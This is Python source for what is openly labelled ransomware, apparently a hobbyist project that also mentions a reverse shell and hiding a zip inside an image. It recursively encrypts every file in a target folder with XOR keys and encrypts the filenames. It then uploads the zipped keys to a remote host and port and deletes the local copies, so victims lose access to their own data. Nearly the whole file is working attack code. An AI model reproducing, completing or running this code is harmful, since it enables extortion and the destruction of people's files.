# scripted by n4zgu1

# reverse_shell and ransomware
# hide .zip in image

from datetime import datetime
from src.upload import upload
from src.cleanUp import clean
from src.encFilenames import *
from src.zip import *
# from pbar import pbar
import socket
import os


def morgoth(target, keyfolder, HOST, PORT):
    thispath = os.getcwd()
    hostname = socket.gethostname()
    zpname = hostname.replace(' ', '-') + '.zip' #path to zip-file
    sep = '#SEP#'
    error = 0
    
    now = datetime.now().strftime('%H:%M:%S')    #get actual time
    
    #encrypt target folder
    try: encrypt_medium(target, keyfolder); print(f'\nENCRYPTED {target} [x]')
    except: print(f'\nENCRYPTED {target} [ ]'); error += 1
        
    writepath(target, keyfolder, sep)   #safe pathnames in a file and log answer
    encrName(target)                    #encrypr filenames and log answer
    
    try:
        zipdir(keyfolder, zpname)   
        if upload(HOST, PORT, zpname):  #send keyfile-zip via email    
            clean(keyfolder)    #remove keyfiles (folder and zip) if data was sended successfully
            os.remove(zpname)

    except Exception as e:
        print('Some Error occurred!!')
        print(e)
        exit()


def encrypt_medium(src, dst):
    print(f"Encrypt medium: {src}\nKeyfile: {dst}\n")
    for path, dirs, files in os.walk(src): #check for files
        if len(files) > 0:  #check if file isnot empty
            for file in files:
                #Creating key_file for actual file
                key_dst = (path + '/.').replace(src, dst)
                #Encrypt file
                encrypt(path + '/', key_dst, file)


def encrypt(src, key_dst, filename):
    #creating path to key_file
    to_encrypt = open(src + filename, 'rb').read()
    size = len(to_encrypt)
    key = os.urandom(size)
    if not os.path.exists(os.path.dirname(key_dst)):
        os.makedirs(os.path.dirname(key_dst))
    with open(key_dst + filename + '.key', 'wb') as key_out:
        key_out.write(key)
    encrypted = bytes(a ^ b for (a, b) in zip(to_encrypt, key))

    with open(src + filename, 'wb') as encrypted_out:
        encrypted_out.write(encrypted)
        print(f'Encrypted {src}{filename}')
